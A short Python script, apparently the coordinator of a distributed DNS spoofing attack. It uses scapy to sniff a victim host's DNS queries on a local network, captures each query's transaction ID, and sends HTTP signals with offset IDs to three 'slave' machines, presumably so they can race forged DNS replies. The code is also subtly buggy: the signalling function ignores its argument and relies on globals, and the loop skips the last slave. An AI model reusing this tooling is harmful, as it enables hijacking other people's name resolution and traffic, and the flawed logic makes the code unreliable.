from scapy.all import *
import requests
import threading

DESTINATION = "192.168.1.15"
SOURCE = "192.168.1.3"

SLAVE_IP = ["192.168.1.8",
            "192.168.1.9",
            "192.168.1.10"]

SLAVES_PORT = "9696"

SLAVE_QID_OFFSET = [5,
                    500,
                    500]

SLAVES_NR = 3


def get_req_arg(slave_id, qid):
    return 'http://' + SLAVE_IP[slave_id] + ':' + SLAVES_PORT + '?start_qid=' + str(qid - SLAVE_QID_OFFSET[slave_id])


def signal_slave(slave_id):
    threading.Thread(
        target=requests.get,
        args=(get_req_arg(i, qid),)).start()


if __name__ == "__main__":

    print("Waiting for DNS requests between " + SOURCE + "and" + DESTINATION)

    while True:
        packet = sniff(
            iface="eth0",
            filter="src host " + SOURCE + " and dst host " + DESTINATION + " and dst port 53", count=1)
        if packet[0].haslayer(DNS):
            dns = packet[0].getlayer(DNS)
            qid = dns.id
            print("QID of the captured packet " + str(qid))
        for i in range(0, SLAVES_NR - 1):
            signal_slave(i)
